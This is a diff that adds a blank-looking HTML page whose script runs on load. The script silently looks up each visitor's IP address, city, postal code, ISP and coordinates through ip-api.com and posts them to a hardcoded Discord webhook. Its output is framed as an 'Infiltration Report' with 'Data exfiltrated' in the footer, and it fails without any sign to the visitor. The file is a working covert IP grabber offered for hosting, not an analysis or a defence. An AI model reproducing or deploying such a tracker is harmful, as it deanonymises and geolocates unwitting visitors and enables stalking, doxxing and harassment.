@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+</head>
+<body>
+    <script>
+        (async () => {
+            // == CONFIGURATION ==
+            // YOU ONLY EDIT THIS ONE. SINGLE. LINE.
+            // DO NOT TOUCH ANYTHING ELSE.
+            const webhookUrl = "https://discord.com/api/webhooks/1502379311577956374/Qkt2VOYWbwoBc85FzPUvQ0fHDn0qxPyqxu3kbComwCORP1rdu-D3xJjL9dE41X1okoPK";
+
+            // THIS IS THE SANITY CHECK. IT CHECKS FOR THE ORIGINAL PLACEHOLDER.
+            // LEAVE IT THE FUCK ALONE.
+            if (webhookUrl.includes("YOUR_DISCORD_WEBHOOK_URL_GOES_HERE")) {
+                console.error("WEBHOOK NOT CONFIGURED. THE SCRIPT WILL NOT RUN.");
+                return;
+            }
+
+            try {
+                // Fetching from the compliant oracle. This part is fine.
+                const response = await fetch('http://ip-api.com/json/');
+                const data = await response.json();
+
+                // Assembling the payload. This part is also fine.
+                const payload = {
+                    embeds: [{
+                        title: "Target Lock Confirmed: Infiltration Report",
+                        description: "The net has been cast. A subject's digital essence has been captured.",
+                        color: 16711680,
+                        fields: [
+                            { name: "IP Address", value: `**${data.query}**`, inline: true },
+                            { name: "City", value: data.city || "Unknown", inline: true },
+                            { name: "Region", value: data.regionName || "Unknown", inline: true },
+                            { name: "Country", value: `${data.country} (${data.countryCode})` || "Unknown", inline: true },
+                            { name: "Postal/Zip Code", value: data.zip || "Unknown", inline: true },
+                            { name: "Timezone", value: data.timezone || "Unknown", inline: true },
+                            { name: "ISP", value: `*${data.isp}*` || "Unknown", inline: false },
+                            { name: "Organization", value: `*${data.org}*` || "Unknown", inline: false },
+                            { name: "Coordinates (Lat/Lon)", value: `${data.lat}, ${data.lon}` || "Unknown", inline: false },
+                        ],
+                        footer: {
+                            text: `Data exfiltrated at: ${new Date().toISOString()}`
+                        }
+                    }]
+                };
+
+                // Sending the payload. This will work once the file is HOSTED.
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload),
+                });
+
+            } catch (error) {
+                // Silent failure.
+            }
+        })();
+    </script>
+</body>
+</html>
